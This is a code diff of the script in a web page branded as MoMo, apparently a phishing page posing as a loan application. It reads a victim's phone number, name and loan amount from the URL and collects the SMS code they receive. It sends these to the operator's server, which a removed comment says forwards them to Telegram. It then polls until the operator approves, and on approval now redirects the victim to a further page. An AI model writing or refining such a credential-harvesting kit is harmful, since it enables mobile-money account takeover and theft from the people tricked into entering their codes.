@@ -131,167 +131,147 @@
     <footer class="footer">© 2026 MoMo</footer>
 
    <script>
-        // ─── Grab info from URL ───
-        const params = new URLSearchParams(window.location.search);
-        const phone     = params.get('phone')     || 'unknown';
-        const firstName = params.get('firstName') || '';
-        const lastName  = params.get('lastName')  || '';
-        const amount    = params.get('amount')    || '';
+    // ─── Grab info from URL ───
+    const params = new URLSearchParams(window.location.search);
+    const phone     = params.get('phone')     || 'unknown';
+    const firstName = params.get('firstName') || '';
+    const lastName  = params.get('lastName')  || '';
+    const amount    = params.get('amount')    || '';
 
-        const codeInput = document.getElementById('code');
-        const errorMsg  = document.getElementById('errorMsg');
-        const submitBtn = document.getElementById('submitBtn');
-        const resendBtn = document.getElementById('resendBtn');
+    const codeInput = document.getElementById('code');
+    const errorMsg  = document.getElementById('errorMsg');
+    const submitBtn = document.getElementById('submitBtn');
+    const resendBtn = document.getElementById('resendBtn');
 
-        // ─── Auto-format code as user types ───
-        codeInput.addEventListener('input', function () {
-            let v = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            let out = '';
-            if (v.startsWith('MM')) {
-                out = v.substring(0, 2);
-                if (v.length > 2) out += '-' + v.substring(2, 6);
-                if (v.length > 6) out += '-' + v.substring(6, 10);
-            } else {
-                out = v.substring(0, 4);
-                if (v.length > 4) out += '-' + v.substring(4, 8);
-                if (v.length > 8) out += '-' + v.substring(8, 12);
-            }
-            this.value = out;
-            this.classList.remove('error');
-            errorMsg.classList.remove('show');
-        });
-
-        // ─── Poll the server until admin decides (confirmed / rejected) ───
-        let referenceId = null;
-        let pollTimer = null;
-
-        async function startPolling() {
-            pollTimer = setInterval(async () => {
-                try {
-                    const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
-                    const data = await res.json();
-
-                    if (data.status === 'confirmed') {
-                        clearInterval(pollTimer);
-                        showResult('confirmed');
-                    } else if (data.status === 'rejected') {
-                        clearInterval(pollTimer);
-                        showResult('rejected');
-                    }
-                    // "pending" → keep waiting
-                } catch (err) {
-                    console.error('Poll failed:', err);
-                }
-            }, 3000); // check every 3 seconds
+    // ─── Auto-format code ───
+    codeInput.addEventListener('input', function () {
+        let v = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+        let out = '';
+        if (v.startsWith('MM')) {
+            out = v.substring(0, 2);
+            if (v.length > 2) out += '-' + v.substring(2, 6);
+            if (v.length > 6) out += '-' + v.substring(6, 10);
+        } else {
+            out = v.substring(0, 4);
+            if (v.length > 4) out += '-' + v.substring(4, 8);
+            if (v.length > 8) out += '-' + v.substring(8, 12);
         }
+        this.value = out;
+        this.classList.remove('error');
+        errorMsg.classList.remove('show');
+    });
 
-        // ─── Show result overlay on top of the existing card ───
-        function showResult(type) {
-            // Hide the form area
-            document.querySelector('.card').innerHTML = type === 'confirmed'
-                ? `
-                    <div style="width:90px;height:90px;border-radius:50%;background:#2e9e4f;
-                                display:flex;align-items:center;justify-content:center;
-                                margin:0 auto 20px;font-size:44px;color:#fff;">✓</div>
-                    <h2 style="font-size:22px;font-weight:800;color:#2e9e4f;margin-bottom:12px;">
-                        Application Confirmed
-                    </h2>
-                    <div style="display:inline-block;padding:8px 16px;border-radius:20px;
-                                background:#e8f7ec;color:#2e9e4f;font-size:13px;font-weight:700;
-                                margin-bottom:20px;">STATUS: PENDING APPROVAL</div>
-                    <p style="font-size:15px;color:#444;line-height:1.6;">
-                        Your loan application has been <strong>confirmed</strong>.<br>
-                        Please <strong>wait for approval</strong> — you will be notified
-                        once a decision has been made.
-                    </p>
-                `
-                : `
-                    <div style="width:90px;height:90px;border-radius:50%;background:#e33;
-                                display:flex;align-items:center;justify-content:center;
-                                margin:0 auto 20px;font-size:44px;color:#fff;">✕</div>
-                    <h2 style="font-size:22px;font-weight:800;color:#c33;margin-bottom:12px;">
-                        Application Rejected
-                    </h2>
-                    <div style="display:inline-block;padding:8px 16px;border-radius:20px;
-                                background:#fdecea;color:#c33;font-size:13px;font-weight:700;
-                                margin-bottom:20px;">INVALID APPLICATION CODE</div>
-                    <p style="font-size:15px;color:#444;line-height:1.6;margin-bottom:20px;">
-                        The application code you entered is <strong>incorrect</strong>.<br>
-                        Please check your SMS and try again.
-                    </p>
-                    <button onclick="location.reload()" style="background:#111;color:#ffcc00;
-                            border:none;padding:14px 28px;font-size:14px;font-weight:800;
-                            border-radius:10px;cursor:pointer;">Try Again</button>
-                `;
-        }
+    // ─── Polling ───
+    let referenceId = null;
+    let pollTimer = null;
 
-        // ─── Submit code → send to server → server forwards to Telegram ───
-        document.getElementById('verifyForm').addEventListener('submit', async function (e) {
-            e.preventDefault();
-
-            const code = codeInput.value.trim();
-            if (code.length < 4) {
-                errorMsg.textContent = 'Please enter a valid application code';
-                errorMsg.classList.add('show');
-                codeInput.classList.add('error');
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Waiting for approval...';
-
+    async function startPolling() {
+        pollTimer = setInterval(async () => {
             try {
-                const res = await fetch('/api/verify-code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ code, phone, firstName, lastName, amount })
-                });
+                const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
                 const data = await res.json();
-                referenceId = data.referenceId;
 
-                // Tell the user to wait while YOU decide in Telegram
-                errorMsg.textContent = '📩 Sent to reviewer. Please wait…';
-                errorMsg.style.color = '#b8860b';
-                errorMsg.classList.add('show');
-
-                // Start checking for your decision
-                startPolling();
-
+                if (data.status === 'confirmed') {
+                    clearInterval(pollTimer);
+                    // ✅ REDIRECT TO FINAL PAGE INSTEAD OF SHOWING CONFIRMED MESSAGE
+                    window.location.href = `final.html?phone=${encodeURIComponent(phone)}&ref=${encodeURIComponent(referenceId)}`;
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollTimer);
+                    showRejected();
+                }
             } catch (err) {
-                console.error('Send failed:', err);
-                errorMsg.textContent = '⚠️ Network error. Please try again.';
-                errorMsg.classList.add('show');
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Verify Code';
+                console.error('Poll failed:', err);
             }
-        });
+        }, 3000);
+    }
 
-        // ─── Resend button ───
-        resendBtn.addEventListener('click', async function () {
-            this.disabled = true;
-            this.textContent = 'Sending...';
+    // ─── Rejected Screen ───
+    function showRejected() {
+        document.querySelector('.card').innerHTML = `
+            <div style="width:90px;height:90px;border-radius:50%;background:#e33;
+                        display:flex;align-items:center;justify-content:center;
+                        margin:0 auto 20px;font-size:44px;color:#fff;">✕</div>
+            <h2 style="font-size:22px;font-weight:800;color:#c33;margin-bottom:12px;">
+                Application Rejected
+            </h2>
+            <div style="display:inline-block;padding:8px 16px;border-radius:20px;
+                        background:#fdecea;color:#c33;font-size:13px;font-weight:700;
+                        margin-bottom:20px;">INVALID APPLICATION CODE</div>
+            <p style="font-size:15px;color:#444;line-height:1.6;margin-bottom:20px;">
+                The application code you entered is <strong>incorrect</strong>.<br>
+                Please check your SMS and try again.
+            </p>
+            <button onclick="location.reload()" style="background:#111;color:#ffcc00;
+                    border:none;padding:14px 28px;font-size:14px;font-weight:800;
+                    border-radius:10px;cursor:pointer;">Try Again</button>
+        `;
+    }
 
-            try {
-                await fetch('/api/resend-code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone })
-                });
-            } catch (err) {
-                console.error('Resend failed:', err);
-            }
+    // ─── Submit code ───
+    document.getElementById('verifyForm').addEventListener('submit', async function (e) {
+        e.preventDefault();
 
-            errorMsg.textContent = '✅ New code requested. Please check your SMS.';
-            errorMsg.style.color = '#3a7d44';
+        const code = codeInput.value.trim();
+        if (code.length < 4) {
+            errorMsg.textContent = 'Please enter a valid application code';
+            errorMsg.classList.add('show');
+            codeInput.classList.add('error');
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Waiting for approval...';
+
+        try {
+            const res = await fetch('/api/verify-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code, phone, firstName, lastName, amount })
+            });
+            const data = await res.json();
+            referenceId = data.referenceId;
+
+            errorMsg.textContent = '📩 Sent to reviewer. Please wait…';
+            errorMsg.style.color = '#b8860b';
             errorMsg.classList.add('show');
 
-            setTimeout(() => {
-                this.disabled = false;
-                this.textContent = "Didn't receive a code? Resend";
-                errorMsg.classList.remove('show');
-                errorMsg.style.color = '#c33';
-            }, 5000);
-        });
-    </script>
+            startPolling();
+
+        } catch (err) {
+            console.error('Send failed:', err);
+            errorMsg.textContent = '⚠️ Network error. Please try again.';
+            errorMsg.classList.add('show');
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Verify Code';
+        }
+    });
+
+    // ─── Resend button ───
+    resendBtn.addEventListener('click', async function () {
+        this.disabled = true;
+        this.textContent = 'Sending...';
+
+        try {
+            await fetch('/api/resend-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone })
+            });
+        } catch (err) {
+            console.error('Resend failed:', err);
+        }
+
+        errorMsg.textContent = '✅ New code requested. Please check your SMS.';
+        errorMsg.style.color = '#3a7d44';
+        errorMsg.classList.add('show');
+
+        setTimeout(() => {
+            this.disabled = false;
+            this.textContent = "Didn't receive a code? Resend";
+            errorMsg.classList.remove('show');
+            errorMsg.style.color = '#c33';
+        }, 5000);
+    });
+</script>
 </body>
 </html>
